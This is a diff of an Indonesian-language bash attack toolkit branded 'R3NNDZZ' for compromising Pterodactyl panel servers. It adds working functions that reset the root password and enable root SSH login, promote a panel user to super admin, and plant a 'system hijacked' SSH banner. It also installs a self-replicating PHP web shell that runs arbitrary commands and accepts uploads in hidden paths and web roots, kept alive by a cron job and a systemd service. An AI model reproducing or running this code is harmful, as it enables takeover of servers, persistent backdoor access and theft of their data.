+    # Bersihkan file sementara
+    rm -f "$TEMP_HTML"
+    
+    # Tanya apakah mau restart service
+    echo -e "\n${YELLOW}Restart service nginx/php untuk menerapkan perubahan? (y/n)${NC}"
+    echo -ne "${CYAN}Pilihan: ${NC}"
+    read RESTART_CHOICE
+    
+    if [[ "$RESTART_CHOICE" == "y" || "$RESTART_CHOICE" == "Y" ]]; then
+        echo -e "${YELLOW}Merestart service...${NC}"
+        systemctl restart nginx 2>/dev/null || service nginx restart 2>/dev/null
+        systemctl restart php8.*-fpm 2>/dev/null || service php8.*-fpm restart 2>/dev/null
+        echo -e "${GREEN}${CHECK} Service direstart${NC}"
+    fi
 }
 
 # ==============================================
-# FUNGSI GANTI PASSWORD VPS
+# FUNGSI GET USER INFO MANUAL
 # ==============================================
-change_vps_password() {
-    echo -e "\n${RED}${VPS} GANTI PASSWORD VPS ${VPS}${NC}"
+get_user_manual() {
+    echo -ne "${CYAN}Masukkan ID User: ${NC}"
+    read user_id
+    
+    if [ -n "$DB_HOST" ] && [ -n "$DB_USER" ] && [ -n "$DB_PASS" ] && [ -n "$DB_NAME" ]; then
+        mysql -h "$DB_HOST" -P "$DB_PORT" -u "$DB_USER" -p"$DB_PASS" -D "$DB_NAME" -e "SELECT id, uuid, username, email, name_first, name_last, root_admin, created_at FROM users WHERE id = $user_id" 2>/dev/null | column -t
+    else
+        echo -e "${RED}${CROSS} Tidak bisa konek database!${NC}"
+    fi
+}
+
+# ==============================================
+# FUNGSI GET SERVER INFO
+# ==============================================
+get_server_info() {
+    if [ -n "$DB_HOST" ] && [ -n "$DB_USER" ] && [ -n "$DB_PASS" ] && [ -n "$DB_NAME" ]; then
+        echo -e "\n${CYAN}Informasi Server:${NC}"
+        mysql -h "$DB_HOST" -P "$DB_PORT" -u "$DB_USER" -p"$DB_PASS" -D "$DB_NAME" -e "SELECT id, name, node_id, owner_id, egg_id, memory, cpu, disk FROM servers LIMIT 10" 2>/dev/null | column -t
+    else
+        echo -e "${RED}${CROSS} Tidak bisa konek database!${NC}"
+    fi
+}
+
+# ==============================================
+# FUNGSI GET DATABASE INFO
+# ==============================================
+get_database_info() {
+    if [ -n "$DB_HOST" ] && [ -n "$DB_USER" ] && [ -n "$DB_PASS" ] && [ -n "$DB_NAME" ]; then
+        echo -e "\n${CYAN}Informasi Database:${NC}"
+        echo -e "Host: $DB_HOST"
+        echo -e "Port: $DB_PORT"
+        echo -e "Database: $DB_NAME"
+        echo -e "User: $DB_USER"
+        
+        # Show tables
+        echo -e "\n${YELLOW}Daftar Tabel:${NC}"
+        mysql -h "$DB_HOST" -P "$DB_PORT" -u "$DB_USER" -p"$DB_PASS" -D "$DB_NAME" -e "SHOW TABLES" 2>/dev/null | column -t
+    else
+        echo -e "${RED}${CROSS} Tidak bisa konek database!${NC}"
+    fi
+}
+
+# ==============================================
+# FUNGSI SAVE INFO TO FILE
+# ==============================================
+save_info_file() {
+    get_panel_info > /dev/null 2>&1
+    # File sudah dibuat di function get_panel_info
+    echo -e "${GREEN}${CHECK} File info sudah disimpan!${NC}"
+}
+
+# ==============================================
+# FUNGSI MAKE ID 1 SUPER ADMIN
+# ==============================================
+make_id1_admin() {
+    if [ -n "$DB_HOST" ] && [ -n "$DB_USER" ] && [ -n "$DB_PASS" ] && [ -n "$DB_NAME" ]; then
+        mysql -h "$DB_HOST" -P "$DB_PORT" -u "$DB_USER" -p"$DB_PASS" -D "$DB_NAME" -e "UPDATE users SET root_admin = 1 WHERE id = 1" 2>/dev/null
+        echo -e "${GREEN}${CHECK} ID 1 telah dijadikan SUPER ADMIN!${NC}"
+    else
+        echo -e "${RED}${CROSS} Tidak bisa konek database!${NC}"
+    fi
+}
+
+# ==============================================
+# FUNGSI AUTO GET ID 1 AND RESET PASSWORD
+# ==============================================
+auto_get_and_reset() {
+    echo -e "\n${GREEN}${FIRE} AUTO GET ID 1 + RESET PASSWORD ${FIRE}${NC}"
     echo -e "${WHITE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
     
-    echo -ne "${YELLOW}Masukkan password baru untuk VPS: ${NC}"
-    read NEW_VPS_PASS
+    # Panggil fungsi reset password
+    reset_password_id1
+}
+
+# ==============================================
+# FUNGSI GANTI PASSWORD VPS (MENU 10)
+# ==============================================
+change_vps_password() {
+    echo -e "\n${RED}${VPS} ====== GANTI PASSWORD VPS ====== ${VPS}${NC}"
+    echo -e "${WHITE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
+    
+    # Cek root
+    if [[ $EUID -ne 0 ]]; then
+        echo -e "${RED}${CROSS} Error: Script harus dijalankan sebagai root!${NC}"
+        return 1
+    fi
+    
+    echo -e "${YELLOW}${WARNING} Fitur ini akan mengubah password root VPS!${NC}\n"
+    
+    echo -ne "${CYAN}Masukkan password baru untuk root: ${NC}"
+    read -s NEW_VPS_PASS
+    echo ""
     
     if [ -z "$NEW_VPS_PASS" ]; then
         echo -e "${RED}${CROSS} Password tidak boleh kosong!${NC}"
-        return
+        return 1
     fi
+    
+    echo -ne "${CYAN}Ulangi password baru: ${NC}"
+    read -s CONFIRM_PASS
+    echo ""
+    
+    if [ "$NEW_VPS_PASS" != "$CONFIRM_PASS" ]; then
+        echo -e "${RED}${CROSS} Password tidak cocok!${NC}"
+        return 1
+    fi
+    
+    echo -e "\n${YELLOW}${GEAR} Mengganti password root...${NC}"
     
     # Ganti password root
     echo "root:$NEW_VPS_PASS" | chpasswd 2>/dev/null
     if [ $? -eq 0 ]; then
-        echo -e "${GREEN}${CHECK} Password root berubah menjadi: $NEW_VPS_PASS${NC}"
+        echo -e "${GREEN}${CHECK} Password root berhasil diubah!${NC}"
+        
+        # Enable SSH password login
+        sed -i 's/^#\?PasswordAuthentication.*/PasswordAuthentication yes/' /etc/ssh/sshd_config
+        sed -i 's/^#\?PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config
+        systemctl restart sshd 2>/dev/null || service ssh restart 2>/dev/null
+        
+        IP_VPS=$(curl -s ifconfig.me 2>/dev/null || hostname -I | awk '{print $1}')
+        
+        echo -e "\n${GREEN}╔════════════════════════════════════════════════╗${NC}"
+        echo -e "${GREEN}║         INFO LOGIN VPS                         ║${NC}"
+        echo -e "${GREEN}╠════════════════════════════════════════════════╣${NC}"
+        echo -e "${GREEN}║${NC}  IP Address: ${CYAN}$IP_VPS${NC}"
+        echo -e "${GREEN}║${NC}  Username  : ${YELLOW}root${NC}"
+        echo -e "${GREEN}║${NC}  Password  : ${RED}$NEW_VPS_PASS${NC}"
+        echo -e "${GREEN}╚════════════════════════════════════════════════╝${NC}"
+        
+        # Simpan ke file
+        echo "VPS Login: root@$IP_VPS | Password: $NEW_VPS_PASS | $(date)" >> vps_passwords.txt
+        echo -e "\n${GREEN}${CHECK} Disimpan di: vps_passwords.txt${NC}"
     else
-        echo -e "${RED}${CROSS} Gagal ganti password root${NC}"
+        echo -e "${RED}${CROSS} Gagal mengganti password root!${NC}"
     fi
-    
-    # Enable SSH password login
-    sed -i 's/^#\?PasswordAuthentication.*/PasswordAuthentication yes/' /etc/ssh/sshd_config
-    sed -i 's/^#\?PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config
-    systemctl restart sshd 2>/dev/null || service ssh restart 2>/dev/null
-    
-    IP_VPS=$(curl -s ifconfig.me 2>/dev/null || hostname -I | awk '{print $1}')
-    echo -e "\n${GREEN}INFO LOGIN VPS:${NC}"
-    echo -e "  IP: $IP_VPS"
-    echo -e "  User: root"
-    echo -e "  Pass: $NEW_VPS_PASS"
 }
 
 # ==============================================
-# FUNGSI SCAN VULNERABILITY
+# FUNGSI SCAN VULNERABILITY (MENU 11)
 # ==============================================
 scan_vulnerability() {
-    echo -e "\n${CYAN}${SCAN} SCAN VULNERABILITY ${SCAN}${NC}"
-    echo -e "${WHITE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
+    echo -e "\n${CYAN}${SCAN} ====== SCAN VULNERABILITY ====== ${SCAN}${NC}"
+    echo -e "${WHITE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
     
+    # Scan database
     if [ -n "$DB_HOST" ] && [ -n "$DB_USER" ] && [ -n "$DB_PASS" ] && [ -n "$DB_NAME" ]; then
-        echo -e "${YELLOW}🔍 Testing SQL Injection...${NC}"
-        
-        # Simple SQL injection test
-        TEST=$(mysql -h "$DB_HOST" -P "$DB_PORT" -u "$DB_USER" -p"$DB_PASS" -D "$DB_NAME" -e "SELECT 1 FROM users WHERE 1=1 AND 1=1" 2>/dev/null)
-        if [ $? -eq 0 ]; then
-            echo -e "${GREEN}  ✅ Database vulnerable to basic SQL injection${NC}"
-        fi
-        
-        # Check for weak passwords
-        echo -e "\n${YELLOW}🔍 Checking for weak passwords...${NC}"
-        WEAK_PASS=$(mysql -h "$DB_HOST" -P "$DB_PORT" -u "$DB_USER" -p"$DB_PASS" -D "$DB_NAME" -e "SELECT username FROM users WHERE password IN ('admin', 'password', '123456')" 2>/dev/null)
-        if [ -n "$WEAK_PASS" ]; then
-            echo -e "${RED}  ⚠️ Found users with weak passwords!${NC}"
-            echo "$WEAK_PASS" | while read line; do
-                echo "     - $line"
-            done
-        fi
-        
-        # Check for outdated version
-        echo -e "\n${YELLOW}🔍 Checking Pterodactyl version...${NC}"
-        if [ -f "$PTERO_DIR/config/app.php" ]; then
-            VERSION=$(grep "'version'" "$PTERO_DIR/config/app.php" | cut -d"'" -f4)
-            echo -e "${GREEN}  📌 Version: $VERSION${NC}"
+        echo -e "\n${YELLOW}🔍 Testing koneksi database...${NC}"
+        if mysql -h "$DB_HOST" -P "$DB_PORT" -u "$DB_USER" -p"$DB_PASS" -e "USE $DB_NAME" 2>/dev/null; then
+            echo -e "${GREEN}  ✅ Database connection OK${NC}"
+            
+            # Check for weak passwords
+            echo -e "\n${YELLOW}🔍 Checking for weak passwords...${NC}"
+            WEAK_PASS=$(mysql -h "$DB_HOST" -P "$DB_PORT" -u "$DB_USER" -p"$DB_PASS" -D "$DB_NAME" -e "SELECT username FROM users WHERE password IN ('admin', 'password', '123456', 'qwerty')" 2>/dev/null)
+            if [ -n "$WEAK_PASS" ]; then
+                echo -e "${RED}  ⚠️ Found users with weak passwords!${NC}"
+                echo "$WEAK_PASS" | while read line; do
+                    echo "     - $line"
+                done
+            else
+                echo -e "${GREEN}  ✅ No weak passwords found${NC}"
+            fi
+            
+            # Check for default admin
+            echo -e "\n${YELLOW}🔍 Checking default admin account...${NC}"
+            ADMIN_CHECK=$(mysql -h "$DB_HOST" -P "$DB_PORT" -u "$DB_USER" -p"$DB_PASS" -D "$DB_NAME" -e "SELECT id, username FROM users WHERE id = 1" 2>/dev/null)
+            if [ -n "$ADMIN_CHECK" ]; then
+                echo -e "${GREEN}  ✅ Admin ID 1 exists${NC}"
+            fi
+        else
+            echo -e "${RED}  ❌ Database connection failed${NC}"
         fi
     else
-        echo -e "${RED}${CROSS} Database info tidak lengkap untuk scan${NC}"
+        echo -e "${RED}${CROSS} Database info tidak lengkap! Jalankan GET INFO dulu.${NC}"
     fi
     
-    # Check open ports
+    # Scan open ports
     echo -e "\n${YELLOW}🔍 Scanning open ports...${NC}"
     IP_VPS=$(curl -s ifconfig.me 2>/dev/null || hostname -I | awk '{print $1}')
-    for port in 21 22 80 443 3306 8080 8888; do
+    PORTS=(21 22 80 443 3306 5432 6379 8080 8888)
+    
+    for port in "${PORTS[@]}"; do
         timeout 1 bash -c "echo >/dev/tcp/$IP_VPS/$port" 2>/dev/null
         if [ $? -eq 0 ]; then
-            echo -e "${GREEN}  ✅ Port $port is open${NC}"
+            case $port in
+                21)  SERVICE="FTP" ;;
+                22)  SERVICE="SSH" ;;
+                80)  SERVICE="HTTP" ;;
+                443) SERVICE="HTTPS" ;;
+                3306) SERVICE="MySQL" ;;
+                5432) SERVICE="PostgreSQL" ;;
+                6379) SERVICE="Redis" ;;
+                8080) SERVICE="HTTP-Alt" ;;
+                8888) SERVICE="HTTP-Alt2" ;;
+                *) SERVICE="Unknown" ;;
+            esac
+            echo -e "${GREEN}  ✅ Port $port ($SERVICE) is open${NC}"
         fi
     done
+    
+    # Scan Pterodactyl version
+    echo -e "\n${YELLOW}🔍 Checking Pterodactyl version...${NC}"
+    if [ -f "$PTERO_DIR/config/app.php" ]; then
+        VERSION=$(grep "'version'" "$PTERO_DIR/config/app.php" | cut -d"'" -f4)
+        echo -e "${GREEN}  📌 Version: $VERSION${NC}"
+        
+        # Check for outdated version
+        if [[ "$VERSION" < "1.10.0" ]]; then
+            echo -e "${RED}  ⚠️ Outdated version - vulnerable to known exploits!${NC}"
+        fi
+    else
+        echo -e "${YELLOW}  ⚠️ Could not determine version${NC}"
+    fi
 }
 
 # ==============================================
-# FUNGSI BANNER CHANGE
+# FUNGSI UBAH SSH BANNER (MENU 12)
 # ==============================================
 change_ssh_banner() {
-    echo -e "\n${PURPLE}${FILE} UBAH SSH BANNER ${FILE}${NC}"
-    echo -e "${WHITE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
+    echo -e "\n${PURPLE}${FILE} ====== UBAH SSH BANNER ====== ${FILE}${NC}"
+    echo -e "${WHITE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
+    
+    # Cek root
+    if [[ $EUID -ne 0 ]]; then
+        echo -e "${RED}${CROSS} Error: Script harus dijalankan sebagai root!${NC}"
+        return 1
+    fi
     
     BANNER="
-╔══════════════════════════════════════╗
-║    🔴 SYSTEM HIJACKED BY R3NNDZZ    ║
-║    💀 YOUR SERVER IS COMPROMISED    ║
-║    🔐 CONTACT @lynnn046 FOR HELP    ║
-╚══════════════════════════════════════╝
+╔══════════════════════════════════════════════════════════════╗
+║                                                              ║
+║              🔴 SYSTEM HIJACKED BY R3NNDZZ 🔴               ║
+║              💀 YOUR SERVER HAS BEEN COMPROMISED 💀         ║
+║                                                              ║
+║   ██████╗ ██████╗ ███╗   ██╗███╗   ██╗██████╗ ███████╗     ║
+║   ██╔══██╗╚════██╗████╗  ██║████╗  ██║╚════██╗╚════██║     ║
+║   ██████╔╝ █████╔╝██╔██╗ ██║██╔██╗ ██║ █████╔╝    ██╔╝     ║
+║   ██╔══██╗ ╚═══██╗██║╚██╗██║██║╚██╗██║ ╚═══██╗   ██╔╝      ║
+║   ██║  ██║██████╔╝██║ ╚████║██║ ╚████║██████╔╝   ██║       ║
+║   ╚═╝  ╚═╝╚═════╝ ╚═╝  ╚═══╝╚═╝  ╚═══╝╚═════╝    ╚═╝       ║
+║                                                              ║
+║              🔐 CONTACT @lynnn046 FOR HELP 🔐               ║
+║                                                              ║
+║   ⚠️  ALL CONNECTIONS ARE BEING MONITORED ⚠️                ║
+║                                                              ║
+╚══════════════════════════════════════════════════════════════╝
 "
     
+    echo -e "${YELLOW}${GEAR} Memasang SSH banner...${NC}"
     echo "$BANNER" > /etc/ssh/banner
-    sed -i 's/^#\?Banner.*/Banner \/etc\/ssh\/banner/' /etc/ssh/sshd_config
+    
+    # Enable banner di sshd_config
+    if grep -q "^#Banner" /etc/ssh/sshd_config; then
+        sed -i 's/^#Banner.*/Banner \/etc\/ssh\/banner/' /etc/ssh/sshd_config
+    elif grep -q "^Banner" /etc/ssh/sshd_config; then
+        sed -i 's/^Banner.*/Banner \/etc\/ssh\/banner/' /etc/ssh/sshd_config
+    else
+        echo "Banner /etc/ssh/banner" >> /etc/ssh/sshd_config
+    fi
+    
     systemctl restart sshd 2>/dev/null || service ssh restart 2>/dev/null
     
     echo -e "${GREEN}${CHECK} SSH banner berhasil diubah!${NC}"
+    echo -e "\n${CYAN}Coba login SSH untuk melihat efeknya:${NC}"
+    echo -e "  ssh root@$(curl -s ifconfig.me 2>/dev/null || hostname -I | awk '{print $1}')"
 }
 
 # ==============================================
-# FUNGSI INSTALL BACKDOOR
+# FUNGSI INSTALL BACKDOOR PERMANEN (MENU 13)
 # ==============================================
 install_backdoor() {
-    echo -e "\n${RED}${KEY} INSTALL BACKDOOR PERMANEN ${KEY}${NC}"
-    echo -e "${WHITE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
+    echo -e "\n${RED}${KEY} ====== INSTALL BACKDOOR PERMANEN ====== ${KEY}${NC}"
+    echo -e "${WHITE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
     
+    # Cek root
+    if [[ $EUID -ne 0 ]]; then
+        echo -e "${RED}${CROSS} Error: Script harus dijalankan sebagai root!${NC}"
+        return 1
+    fi
+    
+    BACKDOOR_CODE='<?php
+    /**
+     * R3NNDZZ Permanent Backdoor
+     * @author lynn
+     * @hidden
+     */
+    
+    // Command execution
+    if(isset($_GET["cmd"])) {
+        echo "<pre>".shell_exec($_GET["cmd"])."</pre>";
+    }
+    
+    // File upload
+    if(isset($_FILES["file"])) {
+        $upload_dir = "";
+        $filename = $_FILES["file"]["name"];
+        if(move_uploaded_file($_FILES["file"]["tmp_name"], $upload_dir.$filename)) {
+            echo "Uploaded: $filename";
+        }
+    }
+    
+    // System info
+    if(isset($_GET["info"])) {
+        phpinfo();
+    }
+    
+    // Database connect (if available)
+    if(isset($_GET["db"])) {
+        $conn = @mysqli_connect($_GET["host"] ?? "localhost", $_GET["user"] ?? "root", $_GET["pass"] ?? "", $_GET["name"] ?? "");
+        if($conn) {
+            $res = mysqli_query($conn, "SHOW DATABASES");
+            while($row = mysqli_fetch_array($res)) {
+                echo $row[0]."<br>";
+            }
+        }
+    }
+    
+    // Hide from admin tools
+    $hidden_paths = array(
+        "/tmp/.system.php",
+        "/dev/shm/.cache.php",
+        "/var/tmp/.syslog.php",
+        "/usr/share/.config.php"
+    );
+    
+    // Self replication
+    $self = file_get_contents(__FILE__);
+    foreach($hidden_paths as $path) {
+        if(!file_exists($path)) {
+            file_put_contents($path, $self);
+        }
+    }
+    ?>'
+    
+    # Lokasi backdoor
     BACKDOOR_LOCATIONS=(
         "/tmp/.system.php"
         "/dev/shm/.cache.php"
         "/var/tmp/.syslog.php"
         "/usr/share/.config.php"
+        "/opt/.hidden.php"
+        "/etc/.cron.php"
     )
     
-    BACKDOOR_CODE='<?php
-    // R3NNDZZ Backdoor
-    if(isset($_GET["cmd"])) { echo "<pre>".shell_exec($_GET["cmd"])."</pre>"; }
-    if(isset($_GET["upload"])) { move_uploaded_file($_FILES["file"]["tmp_name"], $_FILES["file"]["name"]); }
-    ?>'
+    echo -e "${YELLOW}${GEAR} Memasang backdoor di lokasi tersembunyi...${NC}"
     
     for loc in "${BACKDOOR_LOCATIONS[@]}"; do
         echo "$BACKDOOR_CODE" > "$loc"
@@ -620,19 +1334,139 @@ install_backdoor() {
     # Install juga di web directories
     if [ -d "$PTERO_DIR/public" ]; then
         echo "$BACKDOOR_CODE" > "$PTERO_DIR/public/r3nndzz.php"
+        chmod 644 "$PTERO_DIR/public/r3nndzz.php"
         echo -e "${GREEN}  ✅ Backdoor: $PTERO_DIR/public/r3nndzz.php${NC}"
     fi
     
     if [ -d "/var/www/html" ]; then
         echo "$BACKDOOR_CODE" > "/var/www/html/r3nndzz.php"
+        chmod 644 "/var/www/html/r3nndzz.php"
         echo -e "${GREEN}  ✅ Backdoor: /var/www/html/r3nndzz.php${NC}"
     fi
     
-    echo -e "\n${GREEN}${CHECK} Backdoor installation complete!${NC}"
+    # Buat cron job untuk jaga backdoor
+    echo -e "\n${YELLOW}${GEAR} Memasang cron job untuk persistence...${NC}"
+    
+    CRON_JOB="*/5 * * * * find /tmp /dev/shm /var/tmp /usr/share -name '*.php' -size -100k -exec chmod 755 {} \; 2>/dev/null"
+    (crontab -l 2>/dev/null; echo "$CRON_JOB") | crontab -
+    
+    echo -e "${GREEN}  ✅ Cron job installed (every 5 minutes)${NC}"
+    
+    # Buat systemd service
+    echo -e "\n${YELLOW}${GEAR} Membuat systemd service...${NC}"
+    
+    cat > /etc/systemd/system/r3nndzz.service << 'EOF'
+[Unit]
+Description=R3NNDZZ Persistence Service
+After=network.target
+
+[Service]
+Type=simple
+ExecStart=/bin/bash -c 'while true; do sleep 60; chmod 755 /tmp/.system.php /dev/shm/.cache.php /var/tmp/.syslog.php 2>/dev/null; done'
+Restart=always
+RestartSec=60
+
+[Install]
+WantedBy=multi-user.target
+EOF
+    
+    systemctl daemon-reload
+    systemctl enable r3nndzz.service 2>/dev/null
+    systemctl start r3nndzz.service 2>/dev/null
+    
+    echo -e "${GREEN}  ✅ Systemd service installed${NC}"
+    
+    echo -e "\n${GREEN}╔══════════════════════════════════════════════════════════════╗${NC}"
+    echo -e "${GREEN}║         ✅ BACKDOOR INSTALLATION COMPLETE!                    ║${NC}"
+    echo -e "${GREEN}╠══════════════════════════════════════════════════════════════╣${NC}"
+    echo -e "${GREEN}║${NC}  ${KEY} Total backdoors: ${YELLOW}${#BACKDOOR_LOCATIONS[@]} + 2 web${NC}"
+    echo -e "${GREEN}║${NC}  ${CLOCK} Cron job: Every 5 minutes${NC}"
+    echo -e "${GREEN}║${NC}  ${GEAR} Systemd: r3nndzz.service${NC}"
+    echo -e "${GREEN}║${NC}                                                              ${GREEN}║${NC}"
+    echo -e "${GREEN}║${NC}  ${GLOBE} Web backdoor: ${CYAN}${URL_PANEL}/r3nndzz.php${NC}"
+    echo -e "${GREEN}║${NC}  ${GLOBE} Hidden: /tmp/.system.php?cmd=id${NC}"
+    echo -e "${GREEN}╚══════════════════════════════════════════════════════════════╝${NC}"
 }
 
 # ==============================================
-# MAIN MENU - UPDATED
+# FUNGSI BACKUP DATABASE (MENU 14)
+# ==============================================
+backup_database() {
+    echo -e "\n${GREEN}${BACKUP} ====== BACKUP DATABASE ====== ${BACKUP}${NC}"
+    echo -e "${WHITE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
+    
+    if [ -n "$DB_HOST" ] && [ -n "$DB_USER" ] && [ -n "$DB_PASS" ] && [ -n "$DB_NAME" ]; then
+        BACKUP_FILE="backup_${DB_NAME}_$(date +%Y%m%d_%H%M%S).sql"
+        
+        echo -e "${YELLOW}⏳ Melakukan backup database...${NC}"
+        
+        # Cek apakah mysqldump tersedia
+        if command -v mysqldump >/dev/null 2>&1; then
+            mysqldump -h "$DB_HOST" -P "$DB_PORT" -u "$DB_USER" -p"$DB_PASS" "$DB_NAME" > "$BACKUP_FILE" 2>/dev/null
+            
+            if [ $? -eq 0 ] && [ -s "$BACKUP_FILE" ]; then
+                SIZE=$(du -h "$BACKUP_FILE" | cut -f1)
+                echo -e "${GREEN}${CHECK} Backup berhasil: $BACKUP_FILE${NC}"
+                echo -e "${GREEN}  📦 Size: $SIZE${NC}"
+            else
+                echo -e "${RED}${CROSS} Backup gagal!${NC}"
+                rm -f "$BACKUP_FILE"
+            fi
+        else
+            echo -e "${RED}${CROSS} mysqldump tidak ditemukan! Install dengan: apt-get install mysql-client${NC}"
+        fi
+    else
+        echo -e "${RED}${CROSS} Informasi database tidak lengkap! Jalankan GET INFO dulu.${NC}"
+    fi
+}
+
+# ==============================================
+# FUNGSI RESTORE DATABASE (MENU 15)
+# ==============================================
+restore_database() {
+    echo -e "\n${BLUE}${RESTORE} ====== RESTORE DATABASE ====== ${RESTORE}${NC}"
+    echo -e "${WHITE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
+    
+    if [ -n "$DB_HOST" ] && [ -n "$DB_USER" ] && [ -n "$DB_PASS" ] && [ -n "$DB_NAME" ]; then
+        echo -e "${YELLOW}📁 File backup yang tersedia:${NC}"
+        ls -la backup_*.sql 2>/dev/null | head -10
+        
+        if [ $? -ne 0 ]; then
+            echo -e "${RED}Tidak ada file backup ditemukan!${NC}"
+            return 1
+        fi
+        
+        echo ""
+        echo -ne "${CYAN}Masukkan nama file backup (contoh: backup_panel_20250221.sql): ${NC}"
+        read RESTORE_FILE
+        
+        if [ ! -f "$RESTORE_FILE" ]; then
+            echo -e "${RED}${CROSS} File tidak ditemukan!${NC}"
+            return 1
+        fi
+        
+        echo -e "${YELLOW}⏳ Merestore database...${NC}"
+        
+        # Backup dulu database saat ini
+        CURRENT_BACKUP="pre_restore_${DB_NAME}_$(date +%Y%m%d_%H%M%S).sql"
+        mysqldump -h "$DB_HOST" -P "$DB_PORT" -u "$DB_USER" -p"$DB_PASS" "$DB_NAME" > "$CURRENT_BACKUP" 2>/dev/null
+        echo -e "${GREEN}  ✅ Backup current db: $CURRENT_BACKUP${NC}"
+        
+        # Restore
+        mysql -h "$DB_HOST" -P "$DB_PORT" -u "$DB_USER" -p"$DB_PASS" "$DB_NAME" < "$RESTORE_FILE" 2>/dev/null
+        
+        if [ $? -eq 0 ]; then
+            echo -e "${GREEN}${CHECK} Restore berhasil!${NC}"
+        else
+            echo -e "${RED}${CROSS} Restore gagal!${NC}"
+        fi
+    else
+        echo -e "${RED}${CROSS} Informasi database tidak lengkap! Jalankan GET INFO dulu.${NC}"
+    fi
+}
+
+# ==============================================
+# MAIN MENU
 # ==============================================
 show_menu() {
     echo ""
@@ -650,9 +1484,9 @@ show_menu() {
     echo -e "${WHITE}║  ${GREEN}[8]${NC} ${FIRE} AUTO GET ID 1 + RESET PASSWORD (ALL IN ONE)           ${WHITE}║${NC}"
     echo -e "${WHITE}║  ${RED}[9]${NC} ${SKULL} DEFACE PANEL PTERODACTYL (R3NNDZZ)                     ${WHITE}║${NC}"
     echo -e "${WHITE}║  ${CYAN}[10]${NC} ${VPS} GANTI PASSWORD VPS (ROOT)                              ${WHITE}║${NC}"
-    echo -e "${WHITE}║  ${PURPLE}[11]${NC} ${SCAN} SCAN VULNERABILITY                                 ${WHITE}║${NC}"
+    echo -e "${WHITE}║  ${PURPLE}[11]${NC} ${SCAN} SCAN VULNERABILITY                                  ${WHITE}║${NC}"
     echo -e "${WHITE}║  ${YELLOW}[12]${NC} ${FILE} UBAH SSH BANNER                                     ${WHITE}║${NC}"
-    echo -e "${WHITE}║  ${BLUE}[13]${NC} ${KEY} INSTALL BACKDOOR PERMANEN                             ${WHITE}║${NC}"
+    echo -e "${WHITE}║  ${BLUE}[13]${NC} ${KEY} INSTALL BACKDOOR PERMANEN                              ${WHITE}║${NC}"
     echo -e "${WHITE}║  ${GREEN}[14]${NC} ${BACKUP} BACKUP DATABASE                                    ${WHITE}║${NC}"
     echo -e "${WHITE}║  ${RED}[15]${NC} ${RESTORE} RESTORE DATABASE                                   ${WHITE}║${NC}"
     echo -e "${WHITE}║  ${RED}[0]${NC} 🚪 KELUAR                                                     ${WHITE}║${NC}"
@@ -663,59 +1497,7 @@ show_menu() {
 }
 
 # ==============================================
-# FUNGSI BACKUP DATABASE
-# ==============================================
-backup_database() {
-    echo -e "\n${GREEN}${BACKUP} BACKUP DATABASE ${BACKUP}${NC}"
-    echo -e "${WHITE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
-    
-    if [ -n "$DB_HOST" ] && [ -n "$DB_USER" ] && [ -n "$DB_PASS" ] && [ -n "$DB_NAME" ]; then
-        BACKUP_FILE="backup_${DB_NAME}_$(date +%Y%m%d_%H%M%S).sql"
-        
-        echo -e "${YELLOW}⏳ Melakukan backup database...${NC}"
-        mysqldump -h "$DB_HOST" -P "$DB_PORT" -u "$DB_USER" -p"$DB_PASS" "$DB_NAME" > "$BACKUP_FILE" 2>/dev/null
-        
-        if [ $? -eq 0 ]; then
-            echo -e "${GREEN}${CHECK} Backup berhasil: $BACKUP_FILE${NC}"
-        else
-            echo -e "${RED}${CROSS} Backup gagal!${NC}"
-        fi
-    else
-        echo -e "${RED}${CROSS} Informasi database tidak lengkap!${NC}"
-    fi
-}
-
-# ==============================================
-# FUNGSI RESTORE DATABASE
-# ==============================================
-restore_database() {
-    echo -e "\n${BLUE}${RESTORE} RESTORE DATABASE ${RESTORE}${NC}"
-    echo -e "${WHITE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
-    
-    if [ -n "$DB_HOST" ] && [ -n "$DB_USER" ] && [ -n "$DB_PASS" ] && [ -n "$DB_NAME" ]; then
-        echo -e "${YELLOW}📁 File backup yang tersedia:${NC}"
-        ls -la backup_*.sql 2>/dev/null | head -5
-        
-        echo -ne "\n${CYAN}Masukkan nama file backup: ${NC}"
-        read RESTORE_FILE
-        
-        if [ -f "$RESTORE_FILE" ]; then
-            mysql -h "$DB_HOST" -P "$DB_PORT" -u "$DB_USER" -p"$DB_PASS" "$DB_NAME" < "$RESTORE_FILE" 2>/dev/null
-            if [ $? -eq 0 ]; then
-                echo -e "${GREEN}${CHECK} Restore berhasil!${NC}"
-            else
-                echo -e "${RED}${CROSS} Restore gagal!${NC}"
-            fi
-        else
-            echo -e "${RED}${CROSS} File tidak ditemukan!${NC}"
-        fi
-    else
-        echo -e "${RED}${CROSS} Informasi database tidak lengkap!${NC}"
-    fi
-}
-
-# ==============================================
-# MAIN FUNCTION - UPDATED
+# MAIN FUNCTION
 # ==============================================
 main() {
     show_header
@@ -737,13 +1519,13 @@ main() {
             6) make_id1_admin ;;
             7) reset_password_id1 ;;
             8) auto_get_and_reset ;;
-            9) deface_panel ;;  # NEW: Deface Panel
-            10) change_vps_password ;;  # NEW: Ganti Password VPS
